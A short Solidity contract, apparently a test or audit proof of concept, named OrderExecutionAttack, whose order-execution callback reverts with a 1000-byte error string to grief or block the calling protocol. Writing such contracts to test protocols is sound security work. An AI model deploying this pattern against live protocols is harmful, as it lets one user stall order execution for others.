// SPDX-License-Identifier: MIT

pragma solidity 0.8.25;

import "./IOrderCallbackRecevier.sol";

contract OrderExecutionAttack is IOrderCallbackRecevier {
    function afterOrderExecution() external pure {
        bytes memory largeArray = new bytes(1000);

        for (uint i = 0; i < 1000; i++) {
            largeArray[i] = bytes1(uint8(i % 256));
        }
        revert(string(largeArray));
    }
}
